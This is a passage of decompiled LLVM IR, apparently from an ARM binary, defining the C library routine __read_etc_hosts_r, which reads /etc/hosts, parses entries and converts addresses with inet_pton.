  uselistorder i32 (i32, i32)* @__GI_fopen, { 6, 2, 1, 0, 5, 4, 3 }
  uselistorder i32 114, { 2, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_2427c.1313 to i32), { 1, 4, 0, 5, 2, 6, 3, 7 }
}

define i32 @__read_etc_hosts_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-64 = alloca i32, align 4
  %v3_19688 = load i32, i32* @r4, align 4
  %v6_19688 = load i32, i32* @r5, align 4
  %v12_19688 = load i32, i32* @r7, align 4
  %v15_19688 = load i32, i32* @r8, align 4
  %v21_19688 = load i32, i32* @sl, align 4
  %v24_19688 = load i32, i32* @fp, align 4
  store i32 %tmp61, i32* @r4, align 4
  %v1_19694 = sub i32 0, %tmp61
  %v1_19698 = urem i32 %v1_19694, 4
  store i32 %v1_19698, i32* %ip.global-to-local, align 4
  %v2_19698 = icmp eq i32 %v1_19698, 0
  %v0_1969c = load i32, i32* @r2, align 4
  %v0_196a0 = load i32, i32* @r0, align 4
  %v0_196a4 = load i32, i32* @r1, align 4
  %v0_196a8 = load i32, i32* @r3, align 4
  store i32 %v0_196a8, i32* %stack_var_-64, align 4
  store i32 %tmp57, i32* %r2.global-to-local, align 4
  br i1 %v2_19698, label %dec_label_pc_196c8, label %dec_label_pc_196b8

dec_label_pc_196b8:                               ; preds = %entry
  %v2_196b8 = sub i32 %tmp57, %v1_19698
  %v3_196b8 = icmp ult i32 %tmp57, %v1_19698
  br i1 %v3_196b8, label %dec_label_pc_1999c, label %dec_label_pc_196c0

dec_label_pc_196c0:                               ; preds = %dec_label_pc_196b8
  store i32 %v2_196b8, i32* %r2.global-to-local, align 4
  %v2_196c4 = add i32 %v1_19698, %tmp61
  store i32 %v2_196c4, i32* @r4, align 4
  br label %dec_label_pc_196c8

dec_label_pc_196c8:                               ; preds = %entry, %dec_label_pc_196c0
  %v0_196d8 = phi i32 [ %tmp61, %entry ], [ %v2_196c4, %dec_label_pc_196c0 ]
  %v0_196dc = phi i32 [ %tmp57, %entry ], [ %v2_196b8, %dec_label_pc_196c0 ]
  %tmp = icmp ult i32 %v0_196dc, 32
  br i1 %tmp, label %dec_label_pc_1999c, label %dec_label_pc_196d0

dec_label_pc_196d0:                               ; preds = %dec_label_pc_196c8
  store i32 %v0_196a8, i32* %r0.global-to-local, align 4
  %v7_196d4 = icmp eq i32 %v0_196a8, 1
  %v1_196d8 = add i32 %v0_196d8, 32
  store i32 %v1_196d8, i32* @fp, align 4
  %v1_196dc = add i32 %v0_196dc, -32
  store i32 %v1_196dc, i32* @r8, align 4
  br i1 %v7_196d4, label %dec_label_pc_19808, label %dec_label_pc_196e4

dec_label_pc_196e4:                               ; preds = %dec_label_pc_196d0
  store i32 %tmp56, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_196f0 = inttoptr i32 %tmp56 to i32*
  store i32 -1, i32* %v2_196f0, align 4
  %tmp80 = icmp ult i32 %v1_196dc, 4
  br i1 %tmp80, label %dec_label_pc_1999c, label %dec_label_pc_196f8

dec_label_pc_196f8:                               ; preds = %dec_label_pc_196e4
  %v0_196f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_196f8 = add i32 %v0_196f8, -36
  store i32 %v1_196f8, i32* %r3.global-to-local, align 4
  %tmp81 = icmp ult i32 %v1_196f8, 8
  br i1 %tmp81, label %dec_label_pc_1999c, label %dec_label_pc_19704

dec_label_pc_19704:                               ; preds = %dec_label_pc_196f8
  %v0_19704 = load i32, i32* @r8, align 4
  %tmp82 = icmp ult i32 %v0_19704, 16
  br i1 %tmp82, label %dec_label_pc_1999c, label %dec_label_pc_1970c

dec_label_pc_1970c:                               ; preds = %dec_label_pc_19704
  %v1_1970c = add i32 %v0_196f8, -48
  store i32 %v1_1970c, i32* %r3.global-to-local, align 4
  %tmp83 = icmp ult i32 %v1_1970c, 8
  br i1 %tmp83, label %dec_label_pc_1999c, label %dec_label_pc_19718

dec_label_pc_19718:                               ; preds = %dec_label_pc_1970c
  %v1_19718 = add i32 %v0_196f8, -44
  store i32 %v1_19718, i32* @r8, align 4
  %v1_1971c = add i32 %v0_196f8, -56
  store i32 %v1_1971c, i32* %r3.global-to-local, align 4
  %v3_19720 = icmp ult i32 %v1_1971c, %v1_19718
  br i1 %v3_19720, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_19718
  %v1_19728 = load i32, i32* @r4, align 4
  %v2_19728 = add i32 %v1_19728, 44
  br label %bb74

.thread1:                                         ; preds = %dec_label_pc_19718
  store i32 %v1_1971c, i32* @r8, align 4
  %v1_1972c.pre = load i32, i32* @r4, align 4
  %v2_1972c = add i32 %v1_1972c.pre, 56
  br label %bb74

bb74:                                             ; preds = %bb, %.thread1
  %storemerge = phi i32 [ %v2_1972c, %.thread1 ], [ %v2_19728, %bb ]
  %v0_19734 = phi i32 [ %v1_1972c.pre, %.thread1 ], [ %v1_19728, %bb ]
  %v0_19730 = phi i32 [ %v1_1971c, %.thread1 ], [ %v1_19718, %bb ]
  store i32 %storemerge, i32* @r5, align 4
  %v1_19734 = add i32 %v0_19734, 36
  store i32 %v1_19734, i32* @r6, align 4
  %v1_19738 = add i32 %v0_19734, 48
  store i32 %v1_19738, i32* %sl.global-to-local, align 4
  %tmp84 = icmp ult i32 %v0_19730, 80
  br i1 %tmp84, label %dec_label_pc_1999c, label %dec_label_pc_19740

dec_label_pc_19740:                               ; preds = %bb74
  %v0_19740 = call i32 @__open_etc_hosts()
  store i32 %v0_19740, i32* %r0.global-to-local, align 4
  %v2_19744 = icmp eq i32 %v0_19740, 0
  br i1 %v2_19744, label %dec_label_pc_19760, label %.thread

.thread:                                          ; preds = %dec_label_pc_19740
  %v1_1974c = load i32, i32* @fp, align 4
  store i32 %v1_1974c, i32* @r7, align 4
  %v1_19750 = load i32, i32* @r5, align 4
  store i32 %v1_19750, i32* @fp, align 4
  %v1_19754 = load i32, i32* @r6, align 4
  %v1_19758 = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_19814

dec_label_pc_19760:                               ; preds = %dec_label_pc_19740
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %tmp53, i32* %r2.global-to-local, align 4
  %v2_19768 = inttoptr i32 %tmp53 to i32*
  store i32 0, i32* %v2_19768, align 4
  %v0_1976c = call i32 @__errno_location()
  store i32 %v0_1976c, i32* %r0.global-to-local, align 4
  %v1_19770 = inttoptr i32 %v0_1976c to i32*
  %v2_19770 = load i32, i32* %v1_19770, align 4
  store i32 %v2_19770, i32* @sl, align 4
  br label %dec_label_pc_199a0

dec_label_pc_19778:                               ; preds = %dec_label_pc_19928
  %v0_19778 = load i32, i32* @r4, align 4
  %v1_19778 = add i32 %v0_19778, 4
  %v2_19778 = inttoptr i32 %v1_19778 to i32*
  %v3_19778 = load i32, i32* %v2_19778, align 4
  %v1_1977c = load i32, i32* @sb, align 4
  %v2_1977c = inttoptr i32 %v1_1977c to i32*
  store i32 %v3_19778, i32* %v2_1977c, align 4
  store i32 %stack_var_-48.1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp53, i32* %ip.global-to-local, align 4
  %v0_19790 = load i32, i32* @r4, align 4
  %v1_19790 = add i32 %v0_19790, 8
  store i32 %v1_19790, i32* %r1.global-to-local, align 4
  %v1_19794 = load i32, i32* @sb, align 4
  %v2_19794 = add i32 %v1_19794, 8
  %v3_19794 = inttoptr i32 %v2_19794 to i32*
  store i32 2, i32* %v3_19794, align 4
  %v0_19798 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_19798, i32* @sl, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v0_197a0 = load i32, i32* @sb, align 4
  %v1_197a0 = load i32, i32* %ip.global-to-local, align 4
  %v2_197a0 = inttoptr i32 %v1_197a0 to i32*
  store i32 %v0_197a0, i32* %v2_197a0, align 4
  %v0_197a4 = load i32, i32* @r7, align 4
  %v1_197a4 = load i32, i32* %r0.global-to-local, align 4
  %v2_197a4 = inttoptr i32 %v1_197a4 to i32*
  store i32 %v0_197a4, i32* %v2_197a4, align 4
  %v0_197a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_197a8 = load i32, i32* @sb, align 4
  %v2_197a8 = add i32 %v1_197a8, 12
  %v3_197a8 = inttoptr i32 %v2_197a8 to i32*
  store i32 %v0_197a8, i32* %v3_197a8, align 4
  %v0_197ac = load i32, i32* %r0.global-to-local, align 4
  %v1_197ac = load i32, i32* @sb, align 4
  %v2_197ac = add i32 %v1_197ac, 16
  %v3_197ac = inttoptr i32 %v2_197ac to i32*
  store i32 %v0_197ac, i32* %v3_197ac, align 4
  %v0_197b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_197b0 = load i32, i32* @sb, align 4
  %v2_197b0 = add i32 %v1_197b0, 4
  %v3_197b0 = inttoptr i32 %v2_197b0 to i32*
  store i32 %v0_197b0, i32* %v3_197b0, align 4
  %v0_197b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_197b4 = load i32, i32* %r0.global-to-local, align 4
  %v2_197b4 = add i32 %v1_197b4, 4
  %v3_197b4 = inttoptr i32 %v2_197b4 to i32*
  store i32 %v0_197b4, i32* %v3_197b4, align 4
  br label %dec_label_pc_19984

dec_label_pc_197bc:                               ; preds = %dec_label_pc_19950
  store i32 %tmp53, i32* %ip.global-to-local, align 4
  %v0_197c0 = load i32, i32* @r4, align 4
  %v1_197c0 = add i32 %v0_197c0, 4
  %v2_197c0 = inttoptr i32 %v1_197c0 to i32*
  %v3_197c0 = load i32, i32* %v2_197c0, align 4
  store i32 %v3_197c0, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-40.1, i32* %r0.global-to-local, align 4
  %v0_197c8 = load i32, i32* @sb, align 4
  %v2_197c8 = inttoptr i32 %tmp53 to i32*
  store i32 %v0_197c8, i32* %v2_197c8, align 4
  store i32 %v0_19820, i32* %ip.global-to-local, align 4
  %v0_197d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_197d0 = load i32, i32* @sb, align 4
  %v2_197d0 = inttoptr i32 %v1_197d0 to i32*
  store i32 %v0_197d0, i32* %v2_197d0, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_197dc = load i32, i32* %ip.global-to-local, align 4
  %v1_197dc = load i32, i32* %r0.global-to-local, align 4
  %v2_197dc = inttoptr i32 %v1_197dc to i32*
  store i32 %v0_197dc, i32* %v2_197dc, align 4
  %v0_197e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_197e0 = load i32, i32* @sb, align 4
  %v2_197e0 = add i32 %v1_197e0, 12
  %v3_197e0 = inttoptr i32 %v2_197e0 to i32*
  store i32 %v0_197e0, i32* %v3_197e0, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-40.1, i32* %r3.global-to-local, align 4
  %v0_197ec = load i32, i32* @r4, align 4
  %v1_197ec = add i32 %v0_197ec, 8
  store i32 %v1_197ec, i32* %r1.global-to-local, align 4
  %v0_197f0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_197f0, i32* @sl, align 4
  %v1_197f4 = load i32, i32* @sb, align 4
  %v2_197f4 = add i32 %v1_197f4, 8
  %v3_197f4 = inttoptr i32 %v2_197f4 to i32*
  store i32 10, i32* %v3_197f4, align 4
  %v0_197f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_197f8 = load i32, i32* @sb, align 4
  %v2_197f8 = add i32 %v1_197f8, 16
  %v3_197f8 = inttoptr i32 %v2_197f8 to i32*
  store i32 %v0_197f8, i32* %v3_197f8, align 4
  %v0_197fc = load i32, i32* %r1.global-to-local, align 4
  %v1_197fc = load i32, i32* @sb, align 4
  %v2_197fc = add i32 %v1_197fc, 4
  %v3_197fc = inttoptr i32 %v2_197fc to i32*
  store i32 %v0_197fc, i32* %v3_197fc, align 4
  %v0_19800 = load i32, i32* %r2.global-to-local, align 4
  %v1_19800 = load i32, i32* %r3.global-to-local, align 4
  %v2_19800 = add i32 %v1_19800, 4
  %v3_19800 = inttoptr i32 %v2_19800 to i32*
  store i32 %v0_19800, i32* %v3_19800, align 4
  br label %dec_label_pc_19984

dec_label_pc_19808:                               ; preds = %dec_label_pc_196d0
  store i32 0, i32* @r7, align 4
  %.pre = inttoptr i32 %tmp56 to i32*
  br label %dec_label_pc_19814

dec_label_pc_19814:                               ; preds = %.thread, %dec_label_pc_19808
  %v2_19824.pre-phi = phi i32* [ %v2_196f0, %.thread ], [ %.pre, %dec_label_pc_19808 ]
  %v0_19820 = phi i32 [ %v1_1974c, %.thread ], [ 0, %dec_label_pc_19808 ]
  %stack_var_-40.1 = phi i32 [ %v1_19758, %.thread ], [ 0, %dec_label_pc_19808 ]
  %stack_var_-48.1 = phi i32 [ %v1_19754, %.thread ], [ 0, %dec_label_pc_19808 ]
  %stack_var_-52.0 = phi i32 [ %v0_19740, %.thread ], [ %v0_196a0, %dec_label_pc_19808 ]
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 %tmp56, i32* %ip.global-to-local, align 4
  store i32 1, i32* @sl, align 4
  store i32 1, i32* %v2_19824.pre-phi, align 4
  %v2_198e8 = inttoptr i32 %v0_196a4 to i8*
  %v7_19920 = icmp eq i32 %v0_1969c, 2
  %v7_19948 = icmp eq i32 %v0_1969c, 10
  br label %dec_label_pc_1996c

dec_label_pc_1982c:                               ; preds = %dec_label_pc_1996c
  %v0_1982c = load i32, i32* @fp, align 4
  store i32 %v0_1982c, i32* %r0.global-to-local, align 4
  store i32 35, i32* %r1.global-to-local, align 4
  %v2_19834 = call i32 @__GI_strchr(i32 %v0_1982c, i32 35)
  store i32 %v2_19834, i32* %r0.global-to-local, align 4
  %v3_19838 = icmp eq i32 %v2_19834, 0
  br i1 %v3_19838, label %.thread10, label %bb75

.thread10:                                        ; preds = %dec_label_pc_1982c
  %v0_1984011 = load i32, i32* @fp, align 4
  store i32 %v0_1984011, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_198ac.preheader

bb75:                                             ; preds = %dec_label_pc_1982c
  %v3_19834 = inttoptr i32 %v2_19834 to i8*
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_19840 = load i32, i32* @fp, align 4
  store i32 %v0_19840, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i8 0, i8* %v3_19834, align 1
  %v0_198ac30.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_198ac.preheader

dec_label_pc_198ac.preheader:                     ; preds = %bb75, %.thread10
  %v0_198ac30 = phi i32 [ %v0_198ac30.pre, %bb75 ], [ %v0_1984011, %.thread10 ]
  %v1_198ac31 = inttoptr i32 %v0_198ac30 to i8*
  %v2_198ac32 = load i8, i8* %v1_198ac31, align 1
  %v3_198ac33 = zext i8 %v2_198ac32 to i32
  store i32 %v3_198ac33, i32* %r3.global-to-local, align 4
  %v2_198b034 = icmp eq i8 %v2_198ac32, 0
  br i1 %v2_198b034, label %dec_label_pc_198b8, label %dec_label_pc_19858.preheader

dec_label_pc_19850:                               ; preds = %dec_label_pc_19864
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_19854 = inttoptr i32 %v8_1987c to i8*
  store i8 0, i8* %v3_19854, align 1
  %v4_19854 = load i32, i32* %r2.global-to-local, align 4
  %v5_19854 = add i32 %v4_19854, 1
  store i32 %v5_19854, i32* %r2.global-to-local, align 4
  %v1_19858 = inttoptr i32 %v5_19854 to i8*
  %v2_19858 = load i8, i8* %v1_19858, align 1
  %v3_19858 = zext i8 %v2_19858 to i32
  store i32 %v3_19858, i32* %r1.global-to-local, align 4
  %v2_1985c = icmp eq i8 %v2_19858, 0
  br i1 %v2_1985c, label %dec_label_pc_198b8, label %dec_label_pc_19864

dec_label_pc_19864:                               ; preds = %dec_label_pc_19858.preheader, %dec_label_pc_19850
  %v8_1987c = phi i32 [ %v5_19854, %dec_label_pc_19850 ], [ %v0_1985820, %dec_label_pc_19858.preheader ]
  %v1_1986c = phi i32 [ %v3_19858, %dec_label_pc_19850 ], [ %v3_1985823, %dec_label_pc_19858.preheader ]
  %v2_19868 = load i32, i32* @global_var_2c58c, align 4
  store i32 %v2_19868, i32* %r3.global-to-local, align 4
  %v3_1986c = mul nuw nsw i32 %v1_1986c, 2
  %v4_1986c = add i32 %v3_1986c, %v2_19868
  %v5_1986c = inttoptr i32 %v4_1986c to i8*
  %v6_1986c = load i8, i8* %v5_1986c, align 1
  %v8_1986c = zext i8 %v6_1986c to i32
  store i32 %v8_1986c, i32* %r3.global-to-local, align 4
  %v1_19870 = and i32 %v8_1986c, 32
  %v2_19870 = icmp eq i32 %v1_19870, 0
  br i1 %v2_19870, label %dec_label_pc_19878, label %dec_label_pc_19850

dec_label_pc_19878:                               ; preds = %dec_label_pc_19864
  %v0_19878 = load i32, i32* @r6, align 4
  %v7_1987c = icmp slt i32 %v0_19878, 7
  br i1 %v7_1987c, label %bb76, label %dec_label_pc_1988c.preheader

bb76:                                             ; preds = %dec_label_pc_19878
  %v9_1987c = load i32, i32* @r4, align 4
  %v13_1987c = mul i32 %v0_19878, 4
  %v14_1987c = add i32 %v9_1987c, %v13_1987c
  %v15_1987c = inttoptr i32 %v14_1987c to i32*
  store i32 %v8_1987c, i32* %v15_1987c, align 4
  %v8_19880 = load i32, i32* @r6, align 4
  %v9_19880 = add i32 %v8_19880, 1
  store i32 %v9_19880, i32* @r6, align 4
  %v0_1988c25.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1988c.preheader

dec_label_pc_1988c.preheader:                     ; preds = %bb76, %dec_label_pc_19878
  %v0_1988c25 = phi i32 [ %v0_1988c25.pre, %bb76 ], [ %v8_1987c, %dec_label_pc_19878 ]
  %v1_1988c26 = inttoptr i32 %v0_1988c25 to i8*
  %v2_1988c27 = load i8, i8* %v1_1988c26, align 1
  %v3_1988c28 = zext i8 %v2_1988c27 to i32
  store i32 %v3_1988c28, i32* %r1.global-to-local, align 4
  %v2_1989029 = icmp eq i8 %v2_1988c27, 0
  br i1 %v2_1989029, label %dec_label_pc_198ac.loopexit, label %dec_label_pc_19898.lr.ph

dec_label_pc_19898.lr.ph:                         ; preds = %dec_label_pc_1988c.preheader
  %v2_1989c.pre = load i32, i32* @global_var_2c58c, align 4
  br label %dec_label_pc_19898

dec_label_pc_19888:                               ; preds = %dec_label_pc_19898
  %v1_19888 = add i32 %v0_19888, 1
  store i32 %v1_19888, i32* %r2.global-to-local, align 4
  %v1_1988c = inttoptr i32 %v1_19888 to i8*
  %v2_1988c = load i8, i8* %v1_1988c, align 1
  %v3_1988c = zext i8 %v2_1988c to i32
  store i32 %v3_1988c, i32* %r1.global-to-local, align 4
  %v2_19890 = icmp eq i8 %v2_1988c, 0
  br i1 %v2_19890, label %dec_label_pc_198ac.loopexit, label %dec_label_pc_19898

dec_label_pc_19898:                               ; preds = %dec_label_pc_19898.lr.ph, %dec_label_pc_19888
  %v0_19888 = phi i32 [ %v0_1988c25, %dec_label_pc_19898.lr.ph ], [ %v1_19888, %dec_label_pc_19888 ]
  %v1_198a0 = phi i32 [ %v3_1988c28, %dec_label_pc_19898.lr.ph ], [ %v3_1988c, %dec_label_pc_19888 ]
  store i32 %v2_1989c.pre, i32* %r3.global-to-local, align 4
  %v3_198a0 = mul nuw nsw i32 %v1_198a0, 2
  %v4_198a0 = add i32 %v3_198a0, %v2_1989c.pre
  %v5_198a0 = inttoptr i32 %v4_198a0 to i8*
  %v6_198a0 = load i8, i8* %v5_198a0, align 1
  %v8_198a0 = zext i8 %v6_198a0 to i32
  store i32 %v8_198a0, i32* %r3.global-to-local, align 4
  %v1_198a4 = and i32 %v8_198a0, 32
  %v2_198a4 = icmp eq i32 %v1_198a4, 0
  br i1 %v2_198a4, label %dec_label_pc_19888, label %dec_label_pc_198ac.loopexit

dec_label_pc_198ac.loopexit:                      ; preds = %dec_label_pc_19898, %dec_label_pc_19888, %dec_label_pc_1988c.preheader
  %v0_198ac = phi i32 [ %v0_1988c25, %dec_label_pc_1988c.preheader ], [ %v0_19888, %dec_label_pc_19898 ], [ %v1_19888, %dec_label_pc_19888 ]
  %v1_198ac = inttoptr i32 %v0_198ac to i8*
  %v2_198ac = load i8, i8* %v1_198ac, align 1
  %v3_198ac = zext i8 %v2_198ac to i32
  store i32 %v3_198ac, i32* %r3.global-to-local, align 4
  %v2_198b0 = icmp eq i8 %v2_198ac, 0
  br i1 %v2_198b0, label %dec_label_pc_198b8, label %dec_label_pc_19858.preheader

dec_label_pc_19858.preheader:                     ; preds = %dec_label_pc_198ac.preheader, %dec_label_pc_198ac.loopexit
  %v0_1985820 = phi i32 [ %v0_198ac, %dec_label_pc_198ac.loopexit ], [ %v0_198ac30, %dec_label_pc_198ac.preheader ]
  %v1_1985821 = inttoptr i32 %v0_1985820 to i8*
  %v2_1985822 = load i8, i8* %v1_1985821, align 1
  %v3_1985823 = zext i8 %v2_1985822 to i32
  store i32 %v3_1985823, i32* %r1.global-to-local, align 4
  %v2_1985c24 = icmp eq i8 %v2_1985822, 0
  br i1 %v2_1985c24, label %dec_label_pc_198b8, label %dec_label_pc_19864

dec_label_pc_198b8:                               ; preds = %dec_label_pc_198ac.loopexit, %dec_label_pc_19858.preheader, %dec_label_pc_19850, %dec_label_pc_198ac.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_198bc = load i32, i32* @r6, align 4
  %v1_198c0 = load i32, i32* @r4, align 4
  %v5_198c0 = mul i32 %v0_198bc, 4
  %v6_198c0 = add i32 %v1_198c0, %v5_198c0
  %v7_198c0 = inttoptr i32 %v6_198c0 to i32*
  store i32 0, i32* %v7_198c0, align 4
  %v7_198c4 = icmp sgt i32 %v0_198bc, 1
  br i1 %v7_198c4, label %dec_label_pc_198c8, label %dec_label_pc_1996c

dec_label_pc_198c8:                               ; preds = %dec_label_pc_198b8
  %v2_198c8 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_198c8, i32* %r0.global-to-local, align 4
  %v7_198cc = icmp eq i32 %v2_198c8, 1
  br i1 %v7_198cc, label %dec_label_pc_199a0, label %dec_label_pc_198d4

dec_label_pc_198d4:                               ; preds = %dec_label_pc_198c8
  %v7_198d4 = icmp eq i32 %v2_198c8, 2
  br i1 %v7_198d4, label %dec_label_pc_198e0, label %dec_label_pc_1990c.preheader

dec_label_pc_1990c.preheader:                     ; preds = %dec_label_pc_198d4
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1990c

dec_label_pc_198e0:                               ; preds = %dec_label_pc_198d4
  store i32 %v0_196a4, i32* %r0.global-to-local, align 4
  %v0_198e4 = load i32, i32* @r4, align 4
  %v1_198e4 = inttoptr i32 %v0_198e4 to i32*
  %v2_198e4 = load i32, i32* %v1_198e4, align 4
  store i32 %v2_198e4, i32* @r1, align 4
  %v3_198e8 = call i32 @__GI_strcoll(i8* %v2_198e8, i32 %v2_198e4)
  store i32 %v3_198e8, i32* %r0.global-to-local, align 4
  %v2_198ec = icmp eq i32 %v3_198e8, 0
  br i1 %v2_198ec, label %dec_label_pc_1991c, label %dec_label_pc_1996c

dec_label_pc_198f8:                               ; preds = %dec_label_pc_1990c
  %v0_198f8 = load i32, i32* @r4, align 4
  %v4_198f8 = mul i32 %v1_198f8, 4
  %v5_198f8 = add i32 %v0_198f8, %v4_198f8
  %v6_198f8 = inttoptr i32 %v5_198f8 to i32*
  %v7_198f8 = load i32, i32* %v6_198f8, align 4
  store i32 %v7_198f8, i32* %r1.global-to-local, align 4
  %v3_198fc = call i32 @__GI_strcasecmp(i8* %v2_198e8, i32 %v7_198f8)
  store i32 %v3_198fc, i32* %r0.global-to-local, align 4
  %v2_19900 = icmp eq i32 %v3_198fc, 0
  %v0_19904 = load i32, i32* @r5, align 4
  %v1_19904 = add i32 %v0_19904, 1
  store i32 %v1_19904, i32* @r5, align 4
  br i1 %v2_19900, label %dec_label_pc_1991c, label %dec_label_pc_1990c

dec_label_pc_1990c:                               ; preds = %dec_label_pc_1990c.preheader, %dec_label_pc_198f8
  %v1_198f8 = phi i32 [ 1, %dec_label_pc_1990c.preheader ], [ %v1_19904, %dec_label_pc_198f8 ]
  %v1_1990c = load i32, i32* @r6, align 4
  store i32 %v0_196a4, i32* %r0.global-to-local, align 4
  %v5_19914 = icmp slt i32 %v1_198f8, %v1_1990c
  br i1 %v5_19914, label %dec_label_pc_198f8, label %dec_label_pc_1996c

dec_label_pc_1991c:                               ; preds = %dec_label_pc_198f8, %dec_label_pc_198e0
  store i32 %v0_1969c, i32* %r1.global-to-local, align 4
  br i1 %v7_19920, label %dec_label_pc_19928, label %dec_label_pc_19944

dec_label_pc_19928:                               ; preds = %dec_label_pc_1991c
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_1992c = load i32, i32* @r7, align 4
  store i32 %v0_1992c, i32* %r2.global-to-local, align 4
  %v0_19930 = load i32, i32* @r4, align 4
  %v1_19930 = inttoptr i32 %v0_19930 to i32*
  %v2_19930 = load i32, i32* %v1_19930, align 4
  store i32 %v2_19930, i32* %r1.global-to-local, align 4
  %v3_19934 = inttoptr i32 %v2_19930 to i8*
  %v4_19934 = call i32 @inet_pton(i32 2, i8* %v3_19934, i32 %v0_1992c)
  store i32 %v4_19934, i32* %r0.global-to-local, align 4
  %v5_1993c = icmp sgt i32 %v4_19934, 0
  br i1 %v5_1993c, label %dec_label_pc_19778, label %dec_label_pc_19968

dec_label_pc_19944:                               ; preds = %dec_label_pc_1991c
  store i32 %v0_1969c, i32* %r2.global-to-local, align 4
  br i1 %v7_19948, label %dec_label_pc_19950, label %dec_label_pc_19968

dec_label_pc_19950:                               ; preds = %dec_label_pc_19944
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_19954 = load i32, i32* @r4, align 4
  %v1_19954 = inttoptr i32 %v0_19954 to i32*
  %v2_19954 = load i32, i32* %v1_19954, align 4
  store i32 %v2_19954, i32* %r1.global-to-local, align 4
  store i32 %v0_19820, i32* %r2.global-to-local, align 4
  %v3_1995c = inttoptr i32 %v2_19954 to i8*
  %v4_1995c = call i32 @inet_pton(i32 10, i8* %v3_1995c, i32 %v0_19820)
  store i32 %v4_1995c, i32* %r0.global-to-local, align 4
  %v5_19964 = icmp sgt i32 %v4_1995c, 0
  br i1 %v5_19964, label %dec_label_pc_197bc, label %dec_label_pc_19968

dec_label_pc_19968:                               ; preds = %dec_label_pc_19928, %dec_label_pc_19944, %dec_label_pc_19950
  store i32 2, i32* @sl, align 4
  br label %dec_label_pc_1996c

dec_label_pc_1996c:                               ; preds = %dec_label_pc_1990c, %dec_label_pc_198e0, %dec_label_pc_198b8, %dec_label_pc_19968, %dec_label_pc_19814
  %v0_1996c = load i32, i32* @fp, align 4
  store i32 %v0_1996c, i32* %r0.global-to-local, align 4
  %v0_19970 = load i32, i32* @r8, align 4
  store i32 %v0_19970, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-52.0, i32* %r2.global-to-local, align 4
  %v3_19978 = call i32 @fgets(i32 %v0_1996c, i32 %v0_19970, i32 %stack_var_-52.0)
  store i32 %v3_19978, i32* %r0.global-to-local, align 4
  %v2_1997c = icmp eq i32 %v3_19978, 0
  br i1 %v2_1997c, label %dec_label_pc_19984, label %dec_label_pc_1982c

dec_label_pc_19984:                               ; preds = %dec_label_pc_1996c, %dec_label_pc_197bc, %dec_label_pc_19778
  %v2_19984 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_19984, i32* %r3.global-to-local, align 4
  %v7_19988 = icmp eq i32 %v2_19984, 1
  br i1 %v7_19988, label %dec_label_pc_199a0, label %dec_label_pc_19990

dec_label_pc_19990:                               ; preds = %dec_label_pc_19984
  store i32 %stack_var_-52.0, i32* %r0.global-to-local, align 4
  %v1_19994 = inttoptr i32 %stack_var_-52.0 to i8*
  %v2_19994 = call i32 @__GI_fclose(i8* %v1_19994)
  store i32 %v2_19994, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_199a0

dec_label_pc_1999c:                               ; preds = %dec_label_pc_196b8, %bb74, %dec_label_pc_1970c, %dec_label_pc_19704, %dec_label_pc_196f8, %dec_label_pc_196e4, %dec_label_pc_196c8
  store i32 34, i32* @sl, align 4
  br label %dec_label_pc_199a0

dec_label_pc_199a0:                               ; preds = %dec_label_pc_198c8, %dec_label_pc_19984, %dec_label_pc_19990, %dec_label_pc_19760, %dec_label_pc_1999c
  %v0_199a0 = load i32, i32* @sl, align 4
  store i32 %v0_199a0, i32* %r0.global-to-local, align 4
  store i32 %v3_19688, i32* @r4, align 4
  store i32 %v6_19688, i32* @r5, align 4
  store i32 %v12_19688, i32* @r7, align 4
  store i32 %v15_19688, i32* @r8, align 4
  store i32 %v21_19688, i32* @sl, align 4
  store i32 %v24_19688, i32* @fp, align 4
  ret i32 %v0_199a0

; uselistorder directives
  uselistorder i32 %v1_198f8, { 1, 0 }
  uselistorder i32 %v0_198bc, { 1, 0 }
  uselistorder i32 %v3_1985823, { 1, 0 }
  uselistorder i32 %v0_1985820, { 1, 0 }
  uselistorder i32 %v2_19834, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.0, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-40.1, { 1, 0 }
